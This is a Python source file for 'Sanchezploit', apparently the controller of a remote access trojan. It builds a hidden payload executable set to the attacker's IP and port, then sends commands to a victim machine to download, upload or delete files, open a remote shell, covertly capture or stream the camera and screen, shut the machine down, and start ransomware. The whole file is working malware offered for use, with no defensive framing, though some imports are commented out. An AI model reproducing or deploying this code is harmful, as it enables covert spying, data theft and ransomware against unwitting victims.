import os, sys
import time, socket
# import shell
# import live_stream
# import subprocess as sb
# import pyfiglet
import platform
# import random
# from tqdm.auto import tqdm
# import multiprocess as mlt
# import numpy as np, pandas as pd
# import pickle, live_msg, connector

os_name = []
def os_info(action, os_names="posix"):
    if action == ("set"):
        if len(os_name) == 0: 
             os_name.append(os_names)
        else:
            os_name.clear()
            os_name.append(os_names)
    elif action == ("get"):
        return str(os_name[0])

def clear_screen():
    os_name = os_info("get")
    if os_name == ('nt'):
        os.system("cls")
    else:
        os.system("clear")

def global_info(action, args=False):
    pyinstaller_installed = args
    py2exe_installed = args

def set_ip_port(ip_address=None, port_used=None, default_ip=socket.gethostbyname(socket.gethostname()), default_port=4444, default_option=False):
    ip = []
    port = []
    if default_option is False:
        if ip_address == None and port_used == None:
            return False
        else:
            ip.append(ip_address)
            port.append(port_used)
    else:
        ip.append(default_ip)
        port.append(default_port)
    connect = configuration(ip[0], port[0])
    if connect is False:
        print("connection failed to victim")
    while connect is False:
        try:
            connect = configuration(ip[0], port[0])
            time.sleep(0.3)
            print("retrying connect to victim...")
        except KeyboardInterrupt:
            confirm = str(input("abort connect to victim? [y/n] "))
            if confirm == "y":
                return False
            else:
                pass
        except EOFError:
            confirm = str(input("abort connect to victim? [y/n] "))
            if confirm == "y":
                return False
            else:
                pass     
    return True   

def make_ip_port(ip_address, port_used):
    with open("ip.txt", "w") as f:
        ip = f.write(ip_address)
    with open("port.txt", "w") as f:
        port = f.write(port_used)

def get_ip_port():
    try:
        with open("ip.txt", "r") as f:
            ip = f.read()
        with open("port.txt", "r") as f:
            port = f.read()
            port = int(port)
        confirm = str(input(f"are you sure to use ip {ip} with port {port}? [y/n]"))
        if "y" in confirm:
            connect = set_ip_port(ip_address=ip, port_used=port)
            if connect is True:
                clear_screen()
                return True
            else:
                return False
        elif "n" in confirm:
            try:
                ip_address = str(input("enter the ip: "))
                port = input("enter the port ")
                make_ip_port(ip_address, port)
                connect = set_ip_port(ip_address=ip_address, port_used=port)
                if connect is True:
                    return True
                else:
                    return False
            except TypeError:
                get_ip_port()
        elif "abort" in confirm:
            return False
        else:
            try:
                ip_address = str(input("enter the ip: "))
                port = input("enter the port ")
                make_ip_port(ip_address, port)
                connect = set_ip_port(ip_address=ip_address, port_used=port)
                if connect is True:
                    return True
                else:
                    return False
            except TypeError:
                get_ip_port()

    except FileNotFoundError:
        print("you haven't set ip adress yet are you want to set all that to default? (NOT RECOMENDED BECAUSE THIS SCRIPT MUST MATCH WITH PAYLOAD IP AND PORT) or you must write a new paylaod and mathcing the ip and port by chose a 'n' option: ")
        respond = str(input("set to default ip and port? [y/n]: "))
        if respond == ("y"):
            set_ip_port()
            return True

        elif respond == ("n"):
            try:
                ip_address = str(input("enter the ip: "))
                port = input("enter the port ")
                make_ip_port(ip_address, port)
                return True
            except TypeError:
                get_ip_port()
        else:
            get_ip_port()

def style_loading(style_name):
    if style_name == ("sanchezploit_loading"):
        k = 0
        length = len("Loading sanchezploit...")
        while k < 3:
            print("Loading sanchezploit...", end="\r")
            time.sleep(0.1)
            print("lOading sanchezploit...", end="\r")
            time.sleep(0.1)
            print("loAding sanchezploit...", end="\r")
            time.sleep(0.1)
            print("loaDing sanchezploit...", end="\r")
            time.sleep(0.1)
            print("loadIng sanchezploit...", end="\r")
            time.sleep(0.1)
            print("loadiNg sanchezploit...", end="\r")
            time.sleep(0.1)
            print("loadinG sanchezploit...", end="\r")
            time.sleep(0.1)
            print("loading Sanchezploit...", end="\r")
            time.sleep(0.1)
            print("loading sAnchezploit...", end="\r")
            time.sleep(0.1)
            print("loading saNchezploit...", end="\r")
            time.sleep(0.1)
            print("loading sanChezploit...", end="\r")
            time.sleep(0.1)
            print("loading sancHezploit...", end="\r")
            time.sleep(0.1)
            print("loading sanchEzploit...", end="\r")
            time.sleep(0.1)
            print("loading sancheZploit...", end="\r")
            time.sleep(0.1)
            print("loading sanchezPloit...", end="\r")
            time.sleep(0.1)
            print("loading sanchezpLoit...", end="\r")
            time.sleep(0.1)
            print("loading sanchezplOit...", end="\r")
            time.sleep(0.1)
            print("loading sanchezploIt...", end="\r")
            time.sleep(0.1)
            print("loading sanchezploiT...", end="\r")
            time.sleep(0.1)
            print(" "*length, end="\r")
            k += 1

    elif style_name == ("Loading bar"):
        args = ["data", "payload", "dll files", "network configuration"]
        for arg in args:
            print(end="\r")
            for counter in tqdm(range(0, 100), desc=f"Loading {arg}"):
                if "data" in arg:
                    time.sleep(0.1)
                elif "payload" in arg:
                    time.sleep(0.1)
                elif "dll files" in arg:
                    time.sleep(0.1)
                elif "network configuration" in arg:
                    time.sleep(0.1)
        print("all data loaded!!")

    elif style_name == ("normal loading"):
        k = 0
        length = len("Sanchezploit is loading...")
        while k <= 6:
            print("Sanchezploit is loading", end="\r")
            time.sleep(0.3)
            print("Sanchezploit is loading.", end="\r")
            time.sleep(0.3)
            print("Sanchezploit is loading..", end="\r")
            time.sleep(0.3)
            print("Sanchezploit is loading...", end="\r")
            time.sleep(0.3)
            print(" "*length, end="\r")
            k += 1

    elif style_name == ("pacman_loading"):
        k = 0
        print("Sanchezploit is loading")
        while k < 3:
            print("< . . . .", end="\r")
            time.sleep(0.2)
            print(" <. . . .", end="\r")
            time.sleep(0.2)
            print("  - . . .", end="\r")
            time.sleep(0.2)
            print("   <. . .", end="\r")
            time.sleep(0.2)
            print("    - . .", end="\r")
            time.sleep(0.2)
            print("     <. .", end="\r")
            time.sleep(0.2)
            print("      - .", end="\r")
            time.sleep(0.2)
            print("       <.", end="\r")
            time.sleep(0.2)
            print("        -", end="\r")
            time.sleep(0.2)
            print("         <", end="\r")
            time.sleep(0.2)
            print("         <?", end="\r")
            time.sleep(0.3)
            print("         > ", end="\r")
            time.sleep(0.3)
            print("         < ", end="\r")
            time.sleep(0.3)
            print(". . . .  > ", end="\r")
            time.sleep(0.3)
            print(". . . . !> " , end="\r")
            time.sleep(0.3)
            print(". . . .>   ", end="\r")
            time.sleep(0.1)
            print(". . . -   ", end="\r")
            time.sleep(0.1)
            print(". . .>   ", end="\r")
            time.sleep(0.1)
            print(". . -    ", end="\r")
            time.sleep(0.1)
            print(". .>     ", end="\r")
            time.sleep(0.1)
            print(". -      ", end="\r")
            time.sleep(0.1)
            print(".>       ", end="\r")
            time.sleep(0.1)
            print("-        ", end="\r")
            time.sleep(0.1)
            k += 1
        print("\rHave Fun")

def banner():
    clear_screen()
    banner_title = pyfiglet.figlet_format("Sanchezploit")
    version = "V.1"
    author_name = "ALVIN SANCHEZ"
    print(banner_title)
    print(f"""
                      Version: {version}
                    Author: {author_name}
            Based Windows, Linux, OSX Operating System

        """)
    style_list = ["pacman_loading", "sanchezploit_loading", "normal loading"]
    style_used_for = random.choice(style_list)
    style_loading(style_used_for)

def command_features(command):
    arg = []
    if command == ("download"):
        args = ("you will allow download file only from a victim that you specify how much files and what file is before.")
        arg.append(args)

    elif command == ("remove"):
        args = ("this command allows you to remove file or dirs in victim computer without seeing by victim.")    
        arg.append(args)

    elif command == ("upload"):
        args = ("this command allows you to send file only to a victim that you specify how much fies and where file you want to put before.")
        arg.append(args)

    elif command == ("shutdown"):
        args = ("this command allows you to shutdown victim computer without messege or with messege.")
        arg.append(args)

    elif command == ("restart"):
        args = ("this command allows you restart victim computer from your pc")
        arg.append(args)

    elif command == ("hibernate"):
        args = ("this command allows you to hibernate victim computer.")
        arg.append(args)

    elif command == ("execute") or command == ("run"):
        args = ("this command will allows you to execute victim programs or your program that sent in to victim")
        arg.append(args)

    elif command == ("capture camera"):
        args = ("this command will allows you to capture a picture from victim camera")
        arg.append(args)

    elif command == ("streaming_camera"):
        args = ("this command will allows you to stream a video from victim camera without knowing by victim")
        arg.append(args)

    elif command == ("streaming_screen"):
        args = ("this command will allows you to stream video from victim screen only.")
        arg.append(args)
        
    elif command == ("capture screen"):
        args = ("this command will allows you to capture a screenshoot from victim screen")
        arg.append(args)
    elif command == ("pwd"):
        args = ("this command will allows you to see where your payload are")
        arg.append(args)
    elif command == ("ls"):
        args = ("this command will allows you to see what the files and dirs are in your working payload")
        arg.append(args)
    elif command == ("help"):
        args = ("this command is used for displaying features command that you specify")
        arg.append(args)
    else:
        args = ("command not recognized!!")
        arg.append(args)
    str_args = str(arg[0])
    for char in str_args:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.1)

def checking_installation():
    counter = 0
    while counter < 2:
        print("preparing to check installation..\\", end="\r")
        time.sleep(0.1)
        print("preparing to check installation..|", end="\r")
        time.sleep(0.1)
        print("preparing to check installation../", end="\r")
        time.sleep(0.1)
        print("preparing to check installation..-", end="\r")    
        time.sleep(0.1)
        counter += 1
    print("\r")
    programs = ["pyinstaller", "py2exe", "python"]
    for program in programs:
        print("checking installation of " + program, end="\n")
        l = os.system(f"{program}" + " --version")
        l = int(l)
        if l == 0:
            print(program + " = " + "Installed")
            time.sleep(2)
        elif l == 1:
            print(program + " = " + "Not Installed")
            time.sleep(2)
        time.sleep(1)
def grab_info():
    print("gathering computer info.....")
    time.sleep(2)
    platform_name = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    os_type = os.name
    os_info("set", os_names=os_type)
    print("platform name: " + platform_name + str(" ") + os_release + str(" ") + ("Version ") + os_version)
    time.sleep(2)
    print("platform type:  " + os_type)
    processor_name = platform.processor()
    print("processor name: " + processor_name)
    time.sleep(2)
    clear_screen()

def configuration(ip_address, port):
    global IP, PORT
    global s
    IP = ip_address
    PORT = port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        os.system("cls")
        return True

    except ConnectionRefusedError:
        return False    

def searching_file(filename):
    try:
        global drivers
        drivers = []
        pharse = ("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        drivers.clear()
        if len(drivers) == 0:               # self drivers
            for driver_name in pharse:
                driver_name = driver_name + str(":\\")
                if os.path.isdir(driver_name) == True:
                    drivers.append(driver_name)

        for driver in drivers:
            for root, dirsname, files in os.walk(driver):
                for file_name in files:
                    if filename == file_name:
                        path = root + str("\\") + filename
                        return path

    except FileNotFoundError:
        return False

def cmd():
    connected = False
    while True:
        try:
            command = input(str("\nsefc> "))
            if command == ("exit"):
                respond = str(input("are you sure your want to quit? [y/n]"))
                if respond == ("y"):
                    print("closing script..")
                    clear_screen()
                    sys.exit()
                else:
                    pass

            elif ("set payload") in command:
                filename = str(input("input the payload name: ")) + ".py"
                if "\\" in filename:
                    path_to_stored = os.path.pathname(filename)
                    filename_to_stored = os.path.basename(filename)
                else:
                    path_to_stored = os.getcwd()
                    filename_to_stored = filename
                hostname = str(input("input hostname or ip: "))
                port = input("input port: ")
                try:
                    with open("payload\\payload.py", "r") as f:
                        data = f.read()
                    with open(f"payload\\{filename_to_stored}", "w") as f:
                        args1 = ("global_ip = " + f"'{hostname}'")
                        args2 = ("global_port = " + port) 
                        args3 = ("filename = " + f"{filename_to_stored}")
                        f.write(args1 + "\n" + args2 + "\n" + data)
                        f.close()
                    print("[+] Payload succesfully created!!")
                    confirm_installation = str(input("you want to convert to exe? "))
                    if "y" in confirm_installation:
                        clear_screen()
                        print("[+] converting to executable file...")
                        os.system(f"pyinstaller -F payload\\{filename_to_stored}")
                        clear_screen()      
                    else: 
                        path_source_code = str(input("type path you want to move script: "))
                        if "y" in path_source_code:
                            print(f"your source code is in {os.getcwd()}\\payload")
                            return
                        else:
                            os.system(f"move payload\\{filename_to_stored}, {path_source_code}")
                            print("command executed succesfully")
                            return
                    source_code_lock = str(input("keep the source code? "))
                    if "y" in source_code_lock:
                        os.system(f"move payload\\{filename_to_stored}, {os.getcwd()}")
                    else:
                        os.remove(f"payload\\{filename_to_stored}")
                    filename_exe = filename_to_stored.replace(".py", ".exe")
                    filename_dir = os.path.splitext(filename_to_stored)[0]
                    os.system(f"move dist\\{filename_exe}, {path_to_stored}")
                    hidden_files = str(input("set attribute files as hidden? "))
                    if "y" in hidden_files:
                        os.system(f"attrib +H {filename}")
                    else:
                        pass
                    os.removedirs("dist")
                    pychache_dir = os.listdir("__pycache__")
                    build_dir = os.listdir(f"build\\{filename_dir}")
                    os.chdir("__pycache__")
                    for chache in pychache_dir:
                        os.remove(chache)
                    os.chdir("..")
                    os.removedirs("__pycache__")
                    os.chdir("build")
                    os.chdir(filename_dir)
                    for build_file in build_dir:
                        os.remove(build_file)
                    os.chdir("..")
                    os.removedirs(filename_dir)
                    os.chdir("..")
                    os.removedirs("build")
                    file_spec = filename_to_stored.replace(".py", ".spec")
                    os.remove(file_spec)
                except TypeError:
                    print("invalid input!!!")

                except FileNotFoundError:
                    dirs = searching_file("payload.py")
                    if dirs is False:
                        print("File payload.py is not found!!")
                        return

            elif command == ("clear"):
                clear_screen()

            elif command == ("reload"):
                path = os.getcwd()
                path_file = path + str("\\") + "Sanchezploit.py"
                print("reloading script...")
                clear_screen()
                os.system(f"start {path_file}")
                sys.exit()

            elif command == ("exploit"):
                connect = get_ip_port()
                connected = True
                if connect == True:
                    print(f"Connection has been established!")
                    f = console()
                    if f is False:
                        print("your connection to victim is aborted that probally caused by error in syntax or disable by victim")
                        reconnecting = str(input("the network got problem can caused by something, reconnect?"))
                        if "y" in "reconnecting":
                            connect = get_ip_port()
                            if connect:
                                console()
                            else:
                                print("your connection is not established yet") 
                        else:
                            return False
                    else:
                        pass
                else:
                    print("the script is not connected to victim yet!")
                    pass

            elif "help" in command:
                command = command.split()
                if len(command) == 1:
                    print("command lists:")
                    command_list = ["pwd", "upload", "download", "ls", "exit", "shutdown", "hibernate", "restart", "execute or run", "encrypt and decrypt"]
                    for commands in command_list:
                        commands = commands + "\n"
                        for char in commands:
                            sys.stdout.write(char)
                            sys.stdout.flush()
                            time.sleep(0.1)

                elif len(command) == 2:
                    command_features(command[1])

                else:
                    print("too many arguments!!")

            else:
                print("command not recognized!!")
                pass

        except KeyboardInterrupt:
            print("[+] KeyboardInterrupt")
        except EOFError:
            respond = str(input("are you sure your want to quit? [y/n]"))
            if respond == ("y"):
                sys.exit()
            else:
                pass

def windows_registry_key(control_keyname):
    if "mouse key" in control_keyname:
        return str("HKLM\\SYSTEM\\CurrentControlSet\\services\\mouclass")
    elif "keyboard key" in control_keyname: 
        return str("HKLM\\SYSTEM\\CurrentControlSet\\Control\\{4D36E96B-E325-11CE-BFC1-08002BE10318}")
    elif "task manager" in control_keyname:
        return str("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
    elif "LUA" in control_keyname:
        return str("HKCU\\So")
def console():
    try:
        s.send(str("info ip port").encode())
        IP = s.recv(8000)
        vip = IP.decode()
        PORT = s.recv(8000)
        vpo = int(PORT.decode())
        while True:
            command = str(input("console >> "))
            if command == "exit":
                print("requesting to disconnect...")
                s.send(str("disconnectcp").encode())
                clear_screen()
                break               
            elif command == "help":
                command_list = ["pwd", "upload", "download", "ls", "exit", "shutdown", "hibernate", "restart", "execute or run", "encrypt and decrypt"]
                print("command list: ")
                for help_commannd in command_list:
                    print(help_commannd)
            elif command == "close":
                print("requesting to disconnect...")
                s.send(str("disconnectcp").encode())
                clear_screen()
                break
            else:
                results = sending_code(command,vip,vpo)
                if results is False:
                    return False
                
    except KeyboardInterrupt:
        print("[+] KeyboardInterrupt")
        pass
    except EOFError:
        confirm = str(input("disconnect the network? [y/n]: "))
        if "y" in confirm:
            print("requesting to disconnect...")
            s.send(str("disconnectcp").encode())
            clear_screen()
            return
        elif "n" in confirm:
            pass
        else:
            pass
    finally:
        return
    return


def open_file(filename, types=None):
    if types is None:
        with open(filename, "r") as f:
            data = f.read()
        return data
    elif types == "bytes":
        with open(filename, "rb") as f:
            data = f.read()
        return data

def write_file(filename, data, types=None):
    if types is None:
        try:
            with open(filename, "w") as f:
                f.write()
            return True
        except TypeError:
            return False
    elif types == "bytes":
        try:
            with open(filename, "wb") as f:
                data = f.read()
            return True
        except TypeError:
            return False

def sending_code(command,vip,vpo):
    try:
        if ("download") in command:
            s.send(command.encode())
            amount_file = input("ammount of file: ")
            sending_amount = s.send(amount_file.encode())
            time.sleep(2)
            amount_file = int(amount_file)
            counter = 0
            while True:
                filename = input(str("filename: "))
                if filename == "abort":
                    s.send(str("abort").encode())
                    break
                sending_filename = s.send(filename.encode())
                get_buff = s.recv(4000)
                get_buff = get_buff.decode()
                if get_buff == ("0xfaa2h"):
                    print(f"{filename} is not found!!")
                    continue
                size_buff = int(get_buff)
                print(f"downloading files called {filename}....")
                with open(filename, "wb") as file:
                    print("receiving and writing the file data....")
                    data = s.recv(size_buff)
                    file.write(data)
                    file.close()
                counter += 1
                if counter == amount_file:
                    break
            print("all files already received!!")

        elif ("clear") in command:
            clear_screen()

        elif ("print captured cam") in command:
            s.send(command.encode())
            title = str(input("what the title of the command: (default title: 'your face')"))
            s.send(title.encode())
            figlet_mode = str(input("figlet mode? "))
            s.send(figlet_mode.encode())
            args_to_print = str(input("what the messege (has to fill!)"))
            s.send(args_to_print.encode())
         
        elif ("print captured screen") in command:
            s.send(command.encode())
            title = str(input("what the title of the command: (default title: 'your face')"))
            s.send(title.encode())
            figlet_mode = str(input("figlet mode? "))
            s.send(figlet_mode.encode())
            args_to_print = str(input("what the messege (has to fill!)"))
            s.send(args_to_print.encode())

        elif ("start ransomewere") in command:
            s.send(command.encode())
            s.close()
            connector.start(IP, PORT,os_name[0])
            configuration(IP, PORT)

        elif ("capture camera") in command:
            s.send(command.encode())
            print("capturing victim camera...")
            s.close()
            live_stream.control_unit("capture_camera", vip, vpo)
            configuration(IP, PORT)

        elif ("capture screen") in command:
            s.send(command.encode())
            print("capturing victim camera...")
            live_stream.control_unit("screen_shoot", vip, vpo)
            s.close()
            configuration(IP, PORT)         

        elif ("stream camera") in command:
            s.send(command.encode())
            print("changing to streaming mode....")
            s.close()
            live_stream.control_unit("streaming_camera", vip, vpo)
            configuration(IP, PORT)

        elif ("stream screen") in command:
            s.send(command.encode())
            print("changing to steraming mode....")
            s.close()
            live_stream.control_unit("streaming_screen", vip, vpo)
            print("re-configuring the network...")
            configuration(IP, PORT)

        elif ("upload") in command:
            s.send(command.encode())
            amount_file = int(input("input the amount of file you want to send in (int): "))
            send_amount_file = s.send(str(amount_file).encode())
            counter = 0
            while True:
                filename = str(input("Input the filename: "))
                if filename == "abort":
                    s.send(str("abort").encode())
                    break
                if "\\" in filename:
                    path_file = filename
                    print(f"file found {path_file}!!")
                    file_name = os.path.basename(filename)
                else:
                    path_file = searching_file(filename)
                    if path_file == False:
                        print(f"file {filename} is not found!!!")
                        continue
                    file_name = filename
                path = str(input("you want place the file in payload directory? [y/n]: "))
                if "y" in path:
                    path_dest = "self dirs"
                else:
                    path_dest = str(input("enter the path to place the file in target PC: "))
                send_filename = s.send(file_name.encode())
                send_path = s.send(path_dest.encode())
                get_buff = os.path.getsize(path_file)
                print(f"this fileame contains {str(get_buff)} size")
                sending_buff = s.send(str(get_buff).encode())
                time.sleep(2)
                with open(path_file, "rb") as file:
                    data = file.read()
                    sending_data = s.send(data)
                    file.close()
                time.sleep(2)
                counter += 1
                if counter == amount_file:
                    break
                print("all files has been sent!!")

        elif ("pwd") in command:
            s.send(command.encode())
            _list = s.recv(4000)
            _list = _list.decode()
            print(_list)

        elif ("ls") in command:
            s.send(command.encode())
            list_ = s.recv(5000)
            load_data = pickle.loads(list_)
            display = pd.DataFrame(load_data, columns=["Name", "Status"])
            print(display)

        elif ("shutdown") in command:
            s.send(command.encode())
            times = int(input("set delay to shutdown ('otherwise just press enter'):"))
            send_time = s.send(str(times).encode())
            comment = str(input("add a comment ('otherwise just press enter'): "))
            send_comment = s.send(comment.encode())                
            print("closing the session....")
            time.sleep(2)
            s.close()
            print("succesfully closed the network")
            clear_screen()
            cmd()

        elif ("duplicate") in command:
            s.send(command.encode())
            path = str(input("type path you want to place duplicated script"))
            s.send(path.encode())
            

        elif ("run another program") in command:
            s.send(command.encode())
            path = str(input("type ths script path: "))
            s.send(path.encode())
            scirpt_name = str(input("type your script name: "))
            s.send(scirpt_name.encode())

        elif ("restart") in command:
            s.send(command.encode())
            times = int(input("set delay to restart ('otherwise just press enter'): "))
            send_time = s.send(times.encode())
            comment = (str(input("add comment ('otherwise just press enter'): ")))
            send_comment = s.send(comment.encode())
            print("closing the session....")
            time.sleep(2)
            s.close()
            print("succesfully closed the network")
            clear_screen()
            cmd()

        elif ("hibernate") in command:
            s.send(command.encode())
            print("closing the session....")
            s.close()
            print("succesfully closed the network")
            clear_screen()
            cmd()

        elif ("cd") in command:
            s.send(command.encode())
            command = command.split()
            directory = command[1:len(command)]
            directory = " ".join(directory)
            s.send(directory.encode())
            confirm = s.recv(5000)
            confirm = confirm.decode()
            print(confirm)

        elif command == ("delete") or command == ("remove"):
            s.send(command.encode())
            amount_file = int(input("enter amount file: "))
            s.send(str(amount_file).encode())
            counter = 0
            while True:
                filename = str(input("enter the filename: "))
                s.send(filename.encode())
                confirmation = s.recv(4000)
                confirmation = confirmation.decode()
                if confirmation == ("0xfaa4h"):
                    print(f"file {filename} is not found!!")
                else:
                    print(f"file {confirmation} is found!!")
                counter += 1
                if counter == amount_file:
                    break
            print("all files has been deleted")

        elif command == ("execute") or command == ("run"):
            s.send(command.encode())
            programs = str(input("enter the program name to run: "))
            send_programs = s.send(programs.encode())
            confirm_exists = s.recv(5000)
            confirm_exists = confirm_exists.decode()
            if "Program is not found" in confirm_exists:
                print(confirm_exists)
                return
            else:
                print(confirm_exists)
                print("script succesfully executed")
                time.sleep(2)
                print("waiting for returning assignment...")
                confirm_return = s.recv(5000)
                confirm_return = confirm_return.decode()
                print(confirm_return)

        elif command == ("shell"):
            s.send(command.encode())
            print("changing to windows shell....")
            s.close()
            shell.start(IP, PORT)
            configuration(IP, PORT)

        elif len(command) == 0:
            pass

        else:
            print(f"command {command} is not found!!")

    except KeyboardInterrupt:
         print("\n[+] KeyboardInterrupt detected! ")
         pass
    except EOFError:
        print("[+] EOFE detected! ")
        pass
    except ConnectionResetError:
        print("[+] Payload has closed the connection them self!!")
        return False
    except ConnectionAbortedError:
        print("[+] an unexpected action has abort the network!")
        return False
    except ConnectionRefusedError:
        print("[+] an unexpected action has refuse the network!")
        return False
    except Exception as e:
        print(str(e))

if __name__ == '__main__':
    grab_info()
    checking_installation()
    banner()
    cmd()
